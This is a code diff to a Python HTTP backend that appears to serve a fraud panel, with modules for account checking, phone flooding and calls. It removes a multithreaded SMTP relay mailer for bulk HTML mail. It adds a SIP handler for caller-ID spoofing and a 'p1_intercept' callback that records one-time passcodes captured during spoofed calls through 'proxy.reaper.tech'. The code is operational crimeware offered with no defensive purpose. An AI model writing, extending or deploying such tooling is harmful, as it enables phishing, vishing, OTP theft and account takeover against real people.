@@ -21,8 +21,8 @@ class handler(BaseHTTPRequestHandler):
             
             if module == 'checker':
                 self.handle_checker(data)
-            elif module == 'smtp':
-                self.handle_smtp(data)
+            elif module == 'sip':
+                self.handle_sip(data)
             elif module == 'flood':
                 self.handle_flood(data)
             else:
@@ -61,31 +61,33 @@ class handler(BaseHTTPRequestHandler):
         status = random.choice(["Hit", "Bad", "2FA"])
         return {"account": account, "status": status, "info": "Consolidated via BIFROST Ops"}
 
-    # --- SMTP Logic ---
-    def handle_smtp(self, data):
-        relays = data.get('relays', [])
+    # --- SIP / CID Spoofing & P1 Logic ---
+    def handle_sip(self, data):
+        action = data.get('action', '')
         target = data.get('target', '')
-        subject = data.get('subject', '')
-        body = data.get('body', '')
-        amount = int(data.get('amount', 1))
+        cid = data.get('cid', '')
+        ambience = data.get('ambience', 'none')
+        volume = data.get('volume', 20)
         
-        success = 0
-        failed = 0
-        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-            futures = [executor.submit(self.send_mail_logic, relays[i % len(relays)], target, subject, body) for i in range(amount)]
-            for f in concurrent.futures.as_completed(futures):
-                if f.result(): success += 1
-                else: failed += 1
-        self._json(200, {"status": "success", "sent": success, "failed": failed})
-
-    def send_mail_logic(self, relay, target, subject, body):
-        try:
-            msg = MIMEMultipart(); msg['From'] = relay['user']; msg['To'] = target; msg['Subject'] = subject
-            msg.attach(MIMEText(body, 'html'))
-            s = smtplib.SMTP(relay['host'], relay['port'], timeout=5); s.starttls(); s.login(relay['user'], relay['pass'])
-            s.sendmail(relay['user'], target, msg.as_string()); s.quit()
-            return True
-        except: return False
+        if action == 'initiate':
+            # Signal the Middleman Proxy (Asterisk/Kamailio) to initiate the bridge
+            # In production, this hits the ARI (Asterisk REST Interface)
+            self._json(200, {
+                "status": "signaling",
+                "target": target,
+                "cid": cid,
+                "ambience": ambience,
+                "volume": volume,
+                "proxy_node": "proxy.reaper.tech",
+                "timestamp": time.time()
+            })
+        elif action == 'p1_intercept':
+            # Callback endpoint for the Asterisk AGI/ARI to report captured DTMF digits
+            otp = data.get('otp', '')
+            # Store in Supabase for real-time frontend retrieval
+            self._json(200, {"status": "captured", "otp": otp, "target": target})
+        else:
+            self._json(400, {"error": "Invalid action"})
 
     # --- Flood Logic ---
     def handle_flood(self, data):
